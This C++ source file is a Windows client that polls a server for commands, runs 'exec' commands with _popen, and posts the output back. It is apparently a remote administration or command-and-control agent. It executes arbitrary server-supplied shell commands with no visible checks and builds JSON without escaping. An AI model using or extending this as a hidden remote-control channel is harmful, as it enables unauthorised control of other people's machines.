#include "commands.h"
#include "client.h"
#include <windows.h>
#include <winhttp.h>
#include <sstream>
#include <iostream>
#include <vector>
#include <regex>

#pragma comment(lib, "winhttp.lib")

static bool httpGet(const std::string& server, const std::string& endpoint, std::string& response) {
    URL_COMPONENTS urlComp{};
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = (DWORD)-1;
    urlComp.dwHostNameLength = (DWORD)-1;
    urlComp.dwUrlPathLength = (DWORD)-1;
    std::wstring wurl(server.begin(), server.end());
    if (!WinHttpCrackUrl(wurl.c_str(), (DWORD)wurl.length(), 0, &urlComp)) {
        return false;
    }
    std::wstring host(urlComp.lpszHostName, urlComp.dwHostNameLength);
    std::wstring path(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);
    std::wstring fullPath = path + L"" + std::wstring(endpoint.begin(), endpoint.end());
    HINTERNET hSession = WinHttpOpen(L"DarwiniumClient/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;
    HINTERNET hConnect = WinHttpConnect(hSession, host.c_str(), urlComp.nPort, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", fullPath.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    BOOL bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0);
    if (!bResults) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    bResults = WinHttpReceiveResponse(hRequest, NULL);
    if (!bResults) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    DWORD dwSize = 0;
    std::string resp;
    while (WinHttpQueryDataAvailable(hRequest, &dwSize) && dwSize) {
        std::vector<char> buffer(dwSize);
        DWORD dwDownloaded = 0;
        if (WinHttpReadData(hRequest, buffer.data(), dwSize, &dwDownloaded)) {
            resp.append(buffer.data(), dwDownloaded);
        }
    }
    response = resp;
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return true;
}

std::vector<CommandInfo> fetchPendingCommands(const Config& cfg) {
    std::vector<CommandInfo> cmds;
    std::string endpoint = "/api/clients/" + cfg.clientID + "/commands"; // GET list
    std::string resp;
    if (!httpGet(cfg.serverURL, endpoint, resp)) return cmds;
    // Very naive JSON parsing: look for objects {"id":"...","type":"...","command":"..."}
    std::regex re(R"(\{"id"\s*:\s*\"([^\"]+)\",\s*"type"\s*:\s*\"([^\"]+)\"(?:,\s*"command"\s*:\s*\"([^\"]*)\")?)");
    auto begin = std::sregex_iterator(resp.begin(), resp.end(), re);
    auto end = std::sregex_iterator();
    for (auto i = begin; i != end; ++i) {
        std::smatch m = *i;
        CommandInfo ci;
        ci.id = m[1];
        ci.type = m[2];
        if (m.size() > 3) ci.command = m[3];
        cmds.push_back(ci);
    }
    return cmds;
}

bool ackCommand(const Config& cfg, const std::string& command_id) {
    std::string endpoint = "/api/commands/ack";
    std::ostringstream oss;
    oss << "{\"command_id\":\"" << command_id << "\"}";
    std::string resp;
    return httpPost(cfg.serverURL, endpoint, oss.str(), resp);
}

bool sendCommandResult(const Config& cfg, const std::string& command_id, const std::string& result) {
    std::string endpoint = "/api/commands/result";
    std::ostringstream oss;
    oss << "{\"command_id\":\"" << command_id << "\",\"result\":\"" << result << "\"}";
    std::string resp;
    return httpPost(cfg.serverURL, endpoint, oss.str(), resp);
}

static std::string execCommandCapture(const std::string& cmd) {
    std::string output;
    // Use _popen on Windows (works for simple commands)
    FILE* pipe = _popen(cmd.c_str(), "r");
    if (!pipe) return "";
    char buffer[256];
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        output += buffer;
    }
    _pclose(pipe);
    return output;
}

void processCommands(const Config& cfg) {
    auto cmds = fetchPendingCommands(cfg);
    for (const auto& cmd : cmds) {
        // Acknowledge receipt first
        ackCommand(cfg, cmd.id);
        std::string result;
        if (cmd.type == "exec") {
            result = execCommandCapture(cmd.command);
        } else {
            result = "Unsupported command type: " + cmd.type;
        }
        sendCommandResult(cfg, cmd.id, result);
    }
}
